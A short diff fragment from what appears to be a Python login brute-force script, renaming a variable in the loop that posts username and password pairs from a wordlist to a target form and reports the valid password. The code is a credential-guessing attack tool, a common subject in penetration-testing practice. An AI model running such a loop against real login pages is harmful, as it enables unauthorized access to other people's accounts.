@@ -12,8 +12,8 @@ for username in usernames:
 			password = password.strip("\n").encode('latin-1')
 			sys.stdout.write(f"Attempting user:password -> {username}:{password.decode('latin-1')}\r")
 			sys.stdout.flush()
-			r = requests.post(target, data={"username": username, "password": password})
-			if success_message.encode() in r.content:
+			response = requests.post(target, data={"username": username, "password": password})
+			if success_message.encode() in response.content:
 				sys.stdout.write("\n")
 				sys.stdout.write(f"\t[>>>] Valid password {password.decode('latin-1')} found for the user {username}")
 				sys.exit()
